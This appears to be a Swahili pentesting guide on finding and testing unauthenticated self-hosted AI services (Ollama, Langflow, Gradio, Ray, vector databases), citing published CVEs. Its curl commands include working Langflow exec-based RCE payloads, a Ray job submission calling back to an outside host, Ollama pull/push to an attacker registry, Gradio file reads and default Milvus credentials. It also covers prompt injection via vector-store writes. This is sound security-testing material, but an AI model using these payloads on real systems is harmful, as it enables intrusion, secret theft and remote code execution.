# Huduma za AI Zinazojipangia Zenyewe Zilizo Wazi

{{#include ../banners/hacktricks-training.md}}

Timu zinazounda vipengele vya AI mara nyingi huendesha wenyewe model runners, agent builders, demo UIs, compute clusters na vector databases. Nyingi za zana hizi ziliundwa kwa ajili ya laptop au mtandao wa maabara uliofungwa, hivyo **hazina authentication kwa chaguomsingi** au huja na njia ya mkato ya authentication ikiwa imewashwa. Mshambulizi anapoweza kufikia huduma kama hiyo, athari kwa kawaida huwa katika mojawapo ya makundi haya:

- Kutumia GPUs na models bila malipo, na kuiba models za faragha.
- Kuvuja kwa prompts, documents na embeddings.
- Kuvuja kwa siri kutoka kwenye mazingira ya mchakato (funguo za mtoa huduma wa LLM, credentials za cloud).
- Utekelezaji wa code, kwa sababu baadhi ya APIs hizi huendesha code **kama kipengele**.

Ukurasa huu unaeleza jinsi ya kupata huduma hizi na mambo ya kujaribu kwenye kila aina ya API. Kwa kuimarisha inference server inayojipangia yenyewe na leak ya llama.cpp `/slots`, tazama [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Kwa mafaili hasidi ya model, tazama [AI Models RCE](AI-Models-RCE.md).

## Kutambua Aina ya Huduma

Tuma maombi haya bila credentials. Jibu la JSON lenye fields zinazotarajiwa hutambua bidhaa, na mara nyingi toleo lake, linalokuambia ni ukaguzi gani hapa chini unahusika. Ports ni chaguomsingi zilizoorodheshwa kwenye nyaraka au zilizotumika kwenye mifano rasmi ya uendeshaji.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Product | Port ya kawaida | Ombi lisilohitaji authentication | Kinachokitambulisha |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON ya toleo, orodha ya models za ndani |
| Langflow | 7860 | `GET /api/v1/version` | JSON ya toleo la Langflow |
| Gradio | 7860 | `GET /config` | Config ya app yenye toleo la Gradio na component IDs |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, orodha ya jobs zilizowasilishwa |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Thamani ya heartbeat, toleo la Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Toleo la Qdrant, orodha ya collections |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Toleo la Weaviate, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Orodha ya collections, au kosa la authentication |

Huduma hizi pia mara nyingi huchapishwa nyuma ya reverse proxy chini ya path prefix (kwa mfano `/ollama/` au `/ray/`), kwa hiyo rudia maombi hayo chini ya prefix yoyote iliyopatikana kwenye JavaScript bundles au nyaraka za API.

## APIs za inference na usimamizi wa models zisizohitaji authentication

Model runners kwa kawaida hufichua REST API moja inayochanganya routes za inference na routes za usimamizi. Ollama ni mfano mzuri. Haina authentication iliyojengewa ndani na hufunga kwenye `127.0.0.1:11434` kwa chaguomsingi, huku `OLLAMA_HOST` ikibadilisha anwani ya kufunga.<sup>[[1]](#references)[[15]](#references)</sup> Docker image rasmi huweka `OLLAMA_HOST=0.0.0.0:11434` ndani ya container, hutangaza `EXPOSE 11434` na haina maagizo ya `USER`, kwa hiyo server huendeshwa kama root ndani ya container.<sup>[[16]](#references)</sup> `EXPOSE` haichapishi port kwenye host, kwa hiyo ufikiaji kutoka host hutegemea deployment. Amri za `docker run` zilizo kwenye nyaraka hutumia `-p 11434:11434`, na Docker huchapisha mapping kama hiyo kwenye interfaces zote za host isipokuwa IP ya host itolewe.<sup>[[17]](#references)[[18]](#references)</sup>

Kila kundi la routes humpa mshambuliaji nini:<sup>[[2]](#references)</sup>

| Routes | Athari bila authentication |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Orodha ya models za ndani na zilizopakiwa, ikijumuisha models maalum za faragha |
| `POST /api/show` | Maelezo ya model, yakiwemo Modelfile, template na **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inference ya bure kwenye hardware ya mwathiriwa |
| `POST /api/pull`, `/api/push` | Kusababisha server ipakue kutoka, au ipakie model kwenye registry iliyochaguliwa na mshambuliaji |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Kuunda, kubadilisha au kufuta models |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Orodha ya modeli inayorejeshwa bila credentials tayari inathibitisha kuwa huduma imefichuliwa. Modeli maalum mara nyingi huwa na system prompt ya ndani kwenye `/api/show`. Kufanya pull kuelekea host yako kunathibitisha kuwa server hupakua manifests kutoka kwenye registries zilizochaguliwa na mshambuliaji. `/api/push` kuelekea kwenye registry yako hubadilisha ufichuzi huo kuwa wizi wa modeli. Usitumie routes za kuunda au kufuta kwenye targets halisi.

Registry pulls pia ni sehemu ya kushambulia parser, kwa sababu server huhifadhi blobs kwa kutumia thamani kutoka kwenye manifest ya mbali. Katika Probllama (CVE-2024-37032, iliyorekebishwa katika Ollama 0.1.34), `digest` ya manifest ilitumika kama jina la faili bila uthibitishaji. Kwa hiyo, registry hasidi ingeweza kuandika faili nje ya saraka ya blobs kwa kutumia mfuatano wa `../`. Kusukuma manifest iliyotayarishwa, ambayo `digest` yake ilielekeza kwenye faili ya ndani, kulivuja faili hiyo kwenda kwenye registry ya mshambuliaji. Wiz ilipata RCE katika Docker, ambako server huendeshwa kama root, kwa kuandika shared library na kuiongeza kwenye `/etc/ld.so.preload`, kisha kuita `/api/chat` ili mchakato mpya uipakie.<sup>[[15]](#references)</sup> Runner inapoweza kupakua kutoka kwenye registries zozote, kagua jinsi inavyobadilisha sehemu za manifest kuwa paths.

## API zinazotekeleza code kwa muundo wake

### API za kuwasilisha kazi

Distributed compute frameworks huchukulia utekelezaji wa code kuwa kipengele chake kikuu. Ray Jobs API kwenye port ya dashboard (8265) hukubali amri ya shell ya `entrypoint` na kuiendesha kwenye cluster.<sup>[[19]](#references)</sup> Utafiti wa Oligo ShadowRay unasema kuwa Jobs API haina authorization na kwamba dashboard hufungamana na `0.0.0.0`. CVE-2023-48022 inayohusiana nayo inabishaniwa kwa sababu Ray inatarajia kuendeshwa ndani ya mtandao unaodhibitiwa pekee.<sup>[[20]](#references)</sup> Ray iliongeza uthibitishaji wa token wa hiari (`RAY_AUTH_MODE=token`) katika toleo la 2.52.0. Ray 2.59 huiwezesha kwa chaguomsingi kwa clusters za ndani zinazoanzishwa kwa `ray.init()`; `ray start --head` bila token inayopatikana bado inaweza kuanza bila uthibitishaji. Ray inaeleza mpango mpana zaidi wa kuwezesha uthibitishaji kwa chaguomsingi katika toleo la 2.61, kwa hiyo kagua toleo lililosakinishwa na hali ya uanzishaji badala ya kudhani kuwa dashboard iko wazi.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashibodi za aina hii pia zina routes saidizi zinazofaa kuchunguzwa kwenye matoleo ya zamani. Kabla ya Ray 2.8.1, `/log_proxy?url=` ilichukua URL yoyote ya HTTP(S) (SSRF hadi cloud metadata), na `/api/v0/logs/file` ilikubali path yoyote ya `filename`; yote mawili bila authentication.<sup>[[8]](#references)</sup>

### Endpoints za "uthibitishaji" wa code zinazoendesha function definitions

Wajenzi wa agents wanaokubali components maalum za Python wakati mwingine "huthibitisha" code kwa kuichanganua kwa `ast` na kuendesha function definitions pekee kwa `exec()`. Hii si salama. Python hutathmini **decorators na thamani za default za arguments wakati wa kufafanua function**, kwa hivyo code iliyowekwa humo huendeshwa hata kama body ya function haiendeshwi. `POST /api/v1/validate/code` ya Langflow ilifanya kazi kwa njia hii, na haikuwa na authentication kabla ya 1.3.0 (CVE-2025-3248). Kuinua exception iliyo na matokeo ya command husababisha endpoint kurudisha matokeo hayo kwenye response:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Jaribu endpoint yoyote inayokompile, kufanya lint au "kukagua" code ya mtumiaji kwa pattern hii, na upendelee kutumia DNS callback kama uthibitisho.

### Njia za auto-login na token ya superuser chaguomsingi

Zana za mtumiaji mmoja mara nyingi huja na njia ya mkato inayomuingiza kila mgeni kama msimamizi. Katika Langflow, `GET /api/v1/auto_login` hurudisha token za superuser chaguomsingi kwa mpigaji yeyote ikiwa `AUTO_LOGIN` imewashwa. Ikiwa imezimwa, route hujibu `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 hadi 1.10.0 ziliiwasha kwa chaguomsingi (CVE-2026-9103). Kuiunganisha na route ya kuthibitisha code inayohitaji uthibitishaji iliyoelezwa hapo juu hurudisha RCE bila uthibitishaji (CVE-2026-9198, iliripotiwa na Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Vifurushi rasmi vya matoleo ya sasa na picha za Docker huzima auto-login na huhitaji nenosiri la superuser, lakini matawi ya usanidi huiwasha.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Hata bila code execution, token ya superuser inatoa ufikiaji wa kila flow na credentials za provider zilizohifadhiwa. Kwa ukaguzi wa sharti la awali unaohusiana katika automated testing, angalia [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Routes za file-serving na RPC katika ML demo UIs

Frameworks za ML demo huhudumia faili zilizopakiwa na zilizozalishwa kupitia route ya jumla na kuruhusu frontend kuita component helpers za upande wa server. Gradio hufichua `/config`, `/upload` na `/file=<path>` kwa hili.<sup>[[5]](#references)</sup> Miundo miwili inafaa kujaribiwa katika framework yoyote inayofanana:

- **Traversal kutoka kwenye upload subdirectory:** ikiwa file route hukagua tu kwamba path inaanzia ndani ya temp folder, pakia faili ili kuunda subdirectory, kisha utoke humo kwa kutumia `../` au `%2e%2e%2f`. Gradio 4.0 hadi 4.10 (CVE-2023-51449) ilikuwa na athari hii.<sup>[[26]](#references)[[27]](#references)</sup> Tuma ombi kwa `curl --path-as-is` ili client isirekebishe path.
- **Arbitrary method dispatch:** endpoint inayotumia `getattr(component, fn_name)` pamoja na ingizo la mtumiaji humwezesha mshambuliaji kuita helpers za ndani. Kabla ya 4.13.0, `/component_server` ya Gradio ilifanya hivi. Katika 4.3 hadi 4.12, `move_resource_to_block_cache` ilinakili faili yoyote ya ndani hadi kwenye cache, ambako `/file=` ingeweza kuipakua. Katika 3.47 hadi 3.50.2, helpers nyingine ziliruhusu kusoma faili na full-read SSRF.<sup>[[26]](#references)[[28]](#references)</sup> Server iliyorekebishwa hujibu `Function not found.` kwa helpers ambazo hazijawekwa alama kuwa server functions.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Kwenye Hugging Face Spaces, siri za Space ni environment variables, kwa hiyo `/proc/self/environ` ndiyo faili yenye thamani zaidi. Horizon3 ilisoma faili hiyo kwa kutumia kichwa cha HTTP `Range`.<sup>[[26]](#references)</sup>

## Hifadhidata za vekta zinazotumiwa na RAG

RAG huhifadhi vipande vya hati asili, embeddings zake na metadata katika hifadhidata ya vekta, kisha assistant huweka matokeo ya juu zaidi kwenye prompt yake. Kwa hiyo, ufikiaji wa kusoma husababisha leak ya **maandishi ya kawaida ya hati za faragha**. Ufikiaji wa kuandika humwezesha mshambuliaji kuingiza vipande ambavyo baadaye huletwa kwenye prompt za watumiaji wengine; huu ni indirect prompt injection endelevu (tazama [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Kwa hifadhidata za vekta zinazojihostiwa, angalia ikiwa uthibitishaji umesanidiwa au ufikiaji usiojulikana umewashwa:

- **Qdrant**: instances zilizodeployiwa binafsi husikiliza kwenye interfaces zote bila uthibitishaji. Iwapo imesanidiwa, key huwekwa kwenye kichwa cha `api-key` au kama `Authorization: Bearer`. Keys za kusoma pekee na za kila collection zinaweza kuwepo.<sup>[[11]](#references)</sup>
- **Chroma**: uthibitishaji umezimwa kwa chaguomsingi. Uthibitishaji wa token hutumia `Authorization` au `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: maombi yasiyo na credentials huthibitishwa kama `user: anonymous` wakati ufikiaji usiojulikana umewashwa, na hupata ruhusa zozote alizonazo mtumiaji huyo.<sup>[[30]](#references)</sup>
- **Milvus**: uthibitishaji umezimwa isipokuwa `common.security.authorizationEnabled` iwe `true`. Ukiwashwa, mtumiaji chaguomsingi wa `root` hutumia nenosiri `Milvus`, na muundo wa token ni `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Jibu lenye data ya faragha bila credentials linaashiria kuwepo kwa ufichuzi. Uthibitishaji ukiwashwa, tathmini akaunti yoyote ya chaguomsingi ambayo haijabadilishwa kando:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Angalia kama payloads zina maandishi ya hati, vitambulisho vya watumiaji au majina ya tenant. Ili kuonyesha uwezo wa kuandika bila kuchafua data ya production, tengeneza na ufute mara moja collection tupu yenye jina lililo wazi, na fanya hivyo tu ikiwa scope inaruhusu.

Authentication kwenye seva hizi pia inaweza kutekelezwa ikiwa imechelewa. Kwenye seva ya Python FastAPI ya Chroma (1.0.0 hadi angalau 1.5.8, CVE-2026-45829), route ya kuunda collection ilitengeneza embedding function iliyotolewa na client kabla ya ukaguzi wa authentication. Configuration iliyorejelea model ya Hugging Face inayodhibitiwa na mshambuliaji ikiwa na `trust_remote_code: true` iliendesha code ya mshambuliaji hata ombi lilipokataliwa. Rust frontend haikuathiriwa.<sup>[[32]](#references)</sup> Ombi linapobeba configuration ya model au plugin, lijaribu bila credentials na ufuatilie kama kuna fetch inayotoka kwenda kwenye repository ya model yako.

## References

- [1] [Maswali Yanayoulizwa Mara kwa Mara kuhusu Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Nyaraka za API ya Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README ya Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Source ya Langflow - endpoints za API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Source ya Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Source ya Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Source ya Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, matoleo 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Source ya Chroma - mipangilio ya msingi ya Python client](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Source ya Chroma - routes za seva ya FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Usalama](https://qdrant.tech/documentation/security/)
- [12] [Maelezo ya OpenAPI ya Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Maelezo ya OpenAPI ya Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Kuunganisha kwenye Seva ya Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Udhaifu wa Remote Code Execution wa Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile ya Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Nyaraka za Docker za Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Kuchapisha na kufichua ports](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Kampeni ya kwanza inayojulikana ya mashambulizi dhidi ya AI Workloads iliyotumia udhaifu huo porini](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token authentication](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Si Salama kwa Kasi Yoyote: Kutumia Python Exec vibaya kwa RCE isiyohitaji authentication kwenye Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Source ya Langflow - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Kutumia vibaya udhaifu wa kusoma faili kwenye Gradio ili kuiba siri kutoka Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Taarifa ya usalama ya Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit ya marekebisho ya Gradio ya `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Authentication asilia ya Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Authentication](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Kuthibitisha Utambulisho wa Mtumiaji](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast Ilihudumiwa Kabla ya Authentication](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Taarifa ya Usalama ya IBM - Remote Code Execution isiyohitaji Authentication kupitia Kukwepa Auto-Login na Uthibitishaji wa Code (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
